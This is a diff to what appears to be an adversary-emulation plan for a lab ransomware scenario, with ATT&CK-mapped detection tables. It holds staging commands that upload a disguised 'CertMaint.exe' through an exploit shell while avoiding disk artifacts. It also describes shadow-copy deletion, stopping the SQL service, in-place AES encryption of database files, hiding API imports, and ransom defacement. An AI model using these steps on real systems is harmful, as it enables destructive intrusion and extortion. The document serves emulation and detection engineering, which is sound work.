@@ -88,46 +88,23 @@ surface is reduced to a single anomalous process writing `.mdf`/`.ldf` files.
     UploadPortalDB_log.ldf.backup   <original file size>
     ```
 
-#### Stage CertMaint.exe on IIS01 (Attacker Machine → react2shell)
+#### Stage CertMaint.exe on IIS01 (react2shell)
 
-- On the attacker machine, encode `CertMaint.exe` to base64
-
-  ```bash
-  cd resources/payloads/react2shell-tool
-  python encode_payload.py ../ImpactPayload/impact.exe -o CertMaint.b64 -l 0
-  ```
-
-  - ***Expected Output***
-
-    ```text
-    [+] Encoding successful!
-    [*] Lines: 1 x 0 chars
-    ```
-
-- Upload the base64 file to IIS01 via react2shell
+- Stage `impact.exe` as `CertMaint.bin` — encode + stream + decode in one step, no `.b64` disk artifact; then rename to `.exe`
 
   ```
-  upload CertMaint.b64 C:\Windows\Temp\CertMaint.b64
-  ```
-
-  - ***Expected Output***
-
-    ```text
-    [+] File uploaded successfully -> C:\Windows\Temp\CertMaint.b64
-    ```
-
-- Decode to binary and promote to executable
-
-  ```
-  decode C:\Windows\Temp\CertMaint.b64 C:\ProgramData\CertMaint.bin
+  stage ../ImpactPayload/impact.exe C:\ProgramData\CertMaint.bin
   rename C:\ProgramData\CertMaint.bin C:\ProgramData\CertMaint.exe
   ```
 
   - ***Expected Output***
 
     ```text
-    [+] File decoded successfully -> C:\ProgramData\CertMaint.bin
-    [+] File renamed: C:\ProgramData\CertMaint.bin -> C:\ProgramData\CertMaint.exe
+    [*] Staging .../impact.exe (...) -> C:\ProgramData\CertMaint.bin in N chunks (NO .b64 disk artifact)...
+    [*] Progress: N/N chunks
+    [+] File staged successfully -> C:\ProgramData\CertMaint.bin (... bytes, NO .b64 disk artifact!)
+    [*] Renaming C:\ProgramData\CertMaint.bin -> C:\ProgramData\CertMaint.exe via eval (NO spawn - STEALTH!)...
+    [+] File renamed successfully -> C:\ProgramData\CertMaint.exe (NO process spawn!)
     ```
 
 #### Execute Impact Chain (IIS01 SYSTEM dnscat2)
@@ -145,12 +122,12 @@ surface is reduced to a single anomalous process writing `.mdf`/`.ldf` files.
   - ***Expected Output***
 
     ```text
-    [+] VSS shadow copies deleted.
-    [+] Service MSSQL$SQLEXPRESS stopped.
-    [+] Encrypted: C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf
-    [+] Encrypted: C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB_log.ldf
-    [+] Service MSSQL$SQLEXPRESS started.
-    [+] Impact chain complete.
+    [OK] Stale snapshots removed: <N>
+    [OK] MSSQL$SQLEXPRESS: paused
+    [OK] Repackaged C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf (<original_size> -> <padded_size>)
+    [OK] Repackaged C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB_log.ldf (<original_size> -> <padded_size>)
+    [OK] MSSQL$SQLEXPRESS: resumed
+    [OK] Maintenance pass complete.
     ```
 
 #### Verify Encryption (IIS01 SYSTEM dnscat2)
@@ -182,9 +159,11 @@ surface is reduced to a single anomalous process writing `.mdf`/`.ldf` files.
 
 | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
 | - | - | - | - | - | - | - | - | - | - | - |
-| Impact | T1490 | Inhibit System Recovery | Windows | Windows System Event 7 on IIS01: VSS provider reports shadow copy deletion with no preceding `vssadmin.exe` Sysmon Event 1 — deletion via COM `IVssBackupComponents::DeleteSnapshots` called directly from `CertMaint.exe`; supporting: Sysmon Event 1 shows `CertMaint.exe` (child of `cmd.exe`) at SYSTEM integrity as the sole process | Calibrated - Not Benign | `CertMaint.exe` deletes all VSS shadow copies on IIS01 via `IVssBackupComponents` COM interface loaded from `vssapi.dll`; no child process spawned — removes snapshot-based recovery path before database file encryption | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [impact.c](../../resources/payloads/ImpactPayload/impact.c) (deployed as `CertMaint.exe`) | - |
-| Impact | T1489 | Service Stop | Windows | Windows System Event 7036 on IIS01: `MSSQL$SQLEXPRESS` service entered the stopped state; Sysmon Event 1 in the same time window shows `CertMaint.exe` at SYSTEM integrity with no `sc.exe` child — service stop originates from SCM API (`OpenServiceW`/`ControlService`) called directly within `CertMaint.exe` | Calibrated - Not Benign | `CertMaint.exe` stops `MSSQL$SQLEXPRESS` via SCM API to release exclusive OS file locks on `UploadPortalDB.mdf` and `UploadPortalDB_log.ldf`; service is restarted after encryption completes | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [impact.c](../../resources/payloads/ImpactPayload/impact.c) (deployed as `CertMaint.exe`) | - |
-| Impact | T1486 | Data Encrypted for Impact | Windows | Sysmon Event 11 on IIS01: `CertMaint.exe` (child of `cmd.exe`, grandchild of `RuntimeBroker.exe` ghost) writes to `C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf` and `UploadPortalDB_log.ldf`; writing process is not a SQL Server service binary — anomalous writer identity for `.mdf`/`.ldf` file extensions; no `powershell.exe` child process | Calibrated - Not Benign | `CertMaint.exe` opens each database file with `GENERIC_READ\|GENERIC_WRITE`, extends it to PKCS7-padded length via `CreateFileMappingW`, and encrypts in-place with AES-256-CBC using embedded tiny-AES-c; `UploadPortalDB` becomes permanently unreadable (Error 824) without the decryption key | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [impact.c](../../resources/payloads/ImpactPayload/impact.c) (deployed as `CertMaint.exe`) | - |
+| Command and Control | T1105 | Ingress Tool Transfer | Windows | `node.exe` (IIS APPPOOL\react.testlab.local) writes `C:\ProgramData\CertMaint.bin` on IIS01 — Sysmon Event 11; IIS AppPool-bound `node.exe` has no baseline for writing binary files to `C:\ProgramData\` | Not Calibrated - Not Benign | `stage` reads `impact.exe` locally, base64-encodes in Python memory, streams 2000-char chunks into `global.__stageBuffer` on target via eval, flushes decoded binary bytes in one `Buffer.from(__stageBuffer,'base64')` write — no child process spawned, no `.b64` on disk | IIS01 (10.12.10.20) | IIS APPPOOL\react.testlab.local | [file_ops.py stage()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
+| Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `CertMaint.exe` (NT AUTHORITY\SYSTEM on IIS01) loads `advapi32.dll` at runtime via `LoadLibraryW` (Sysmon Event 7: image load) — static PE scan of `CertMaint.exe` shows a sparse import table with SCM function names (`OpenSCManagerW`, `ControlService`, `StartServiceW`) visible only as stack strings, not PE import declarations | Calibrated - Not Benign | `CertMaint.exe` resolves all SCM API function pointers at startup via `LoadLibraryW`+`GetProcAddress` with stack-string names; no SCM function names appear in the IAT or `.rdata`; `advapi32.dll` module handle held for process lifetime | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [impact.c init_scm_imports()](../../resources/payloads/ImpactPayload/impact.c) | - |
+| Impact | T1490 | Inhibit System Recovery | Windows | `CertMaint.exe` (child of `cmd.exe`, SYSTEM integrity) loads `vssapi.dll` on IIS01 — Sysmon Event 7 module load; `vssapi.dll` loaded at runtime via `LoadLibraryW` by a non-backup-agent binary indicates COM-based VSS interaction outside normal backup agent paths | Calibrated - Not Benign | `CertMaint.exe` deletes all VSS shadow copies on IIS01 via `IVssBackupComponents` COM interface loaded from `vssapi.dll`; no child process spawned — removes snapshot-based recovery path before database file encryption | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [impact.c](../../resources/payloads/ImpactPayload/impact.c) (deployed as `CertMaint.exe`) | - |
+| Impact | T1489 | Service Stop | Windows | Windows System Event 7036 on IIS01: `MSSQL$SQLEXPRESS` enters stopped state; Sysmon Event 1 in the same time window shows `CertMaint.exe` (NT AUTHORITY\SYSTEM, child of `cmd.exe`) as the active elevated process — service state change correlated with anomalous non-SQL binary | Calibrated - Not Benign | `CertMaint.exe` stops `MSSQL$SQLEXPRESS` via SCM API to release exclusive OS file locks on `UploadPortalDB.mdf` and `UploadPortalDB_log.ldf`; service is restarted after encryption completes | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [impact.c](../../resources/payloads/ImpactPayload/impact.c) (deployed as `CertMaint.exe`) | - |
+| Impact | T1486 | Data Encrypted for Impact | Windows | Sysmon Event 11 on IIS01: `CertMaint.exe` (NT AUTHORITY\SYSTEM, child of `cmd.exe`) writes to `C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf` and `UploadPortalDB_log.ldf`; expected writer for `.mdf`/`.ldf` files is `sqlservr.exe` (MSSQL$SQLEXPRESS service binary) | Calibrated - Not Benign | `CertMaint.exe` opens each database file with `GENERIC_READ\|GENERIC_WRITE`, extends it to PKCS7-padded length via `CreateFileMappingW`, and encrypts in-place with AES-256-CBC using embedded tiny-AES-c; `UploadPortalDB` becomes permanently unreadable (Error 824) without the decryption key | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [impact.c](../../resources/payloads/ImpactPayload/impact.c) (deployed as `CertMaint.exe`) | - |
 
 ---
 
@@ -286,10 +265,10 @@ the upload portal.
 
 | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
 | - | - | - | - | - | - | - | - | - | - | - |
-| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 13 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) writes `LegalNoticeCaption` and `LegalNoticeText` string values under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`; registry key path matches Windows logon-screen policy | Calibrated - Not Benign | `Set-ItemProperty` modifies `LegalNoticeCaption` and `LegalNoticeText` on DC01 to display a ransom message at domain logon — affects all domain-joined machines drawing policy from this DC | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
+| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 13 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) writes `LegalNoticeCaption` and `LegalNoticeText` string values under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` | Calibrated - Not Benign | `Set-ItemProperty` modifies `LegalNoticeCaption` and `LegalNoticeText` on DC01 to display a ransom message at domain logon — affects all domain-joined machines drawing policy from this DC; indistinguishable from legitimate admin action without independent ghost-process detection (cross-row dependency on Herpaderping detection from Phase 1) | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
 | Defense Evasion | T1112 | Modify Registry | Windows | Sysmon Event 13 on DC01: `powershell.exe` sets `LegalNoticeCaption` (REG_SZ) and `LegalNoticeText` (REG_SZ) under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` via `Set-ItemProperty`; parent process is `RuntimeBroker.exe` ghost | Not Calibrated - Not Benign | Registry modification implementing the logon-banner defacement; same physical event as T1491.001 above but independently scored as a registry-modification behavior | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
-| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) creates `README_DECRYPT.txt` at `C:\` and `C:\Users\Administrator\Desktop\` | Calibrated - Not Benign | `Set-Content` drops ransom note text files at two paths on DC01; file name `README_DECRYPT.txt` matches ransomware ransom-note naming convention | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
-| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on IIS01: `powershell.exe` (child of `cmd.exe`, grandchild of `RuntimeBroker.exe` ghost) creates `index.html` in `C:\inetpub\upload.testlab.local\`; writing process identity is NT AUTHORITY\SYSTEM — anomalous for a web root file write where the expected writer is an IIS AppPool; HTTP access to `upload.testlab.local/` now returns ransom page | Calibrated - Not Benign | `Set-Content` from the SYSTEM dnscat2 shell overwrites the upload portal landing page (`C:\inetpub\upload.testlab.local\index.html`) with a ransom HTML page; `IIS APPPOOL\react.testlab.local` lacks write access to this directory — SYSTEM identity is required | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
+| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) creates `README_DECRYPT.txt` at `C:\` and `C:\Users\Administrator\Desktop\` | Not Calibrated - Not Benign | `Set-Content` drops ransom note text files at two paths on DC01; filename is adversary-controlled and not a valid detection criterion; without filename, the file write is indistinguishable from legitimate admin file creation — same ghost-parent dependency as the logon banner row | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
+| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on IIS01: `powershell.exe` (NT AUTHORITY\SYSTEM) writes `C:\inetpub\upload.testlab.local\index.html`; `powershell.exe` running as SYSTEM is not a normal IIS web content writer — expected writer is an IIS AppPool service identity or recognized deployment tool (`msiexec.exe`, `robocopy.exe`) | Calibrated - Not Benign | `Set-Content` from the SYSTEM dnscat2 shell overwrites the upload portal landing page (`C:\inetpub\upload.testlab.local\index.html`) with a ransom HTML page; `IIS APPPOOL\react.testlab.local` lacks write access to this directory — SYSTEM identity is required | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
 
 ---
 
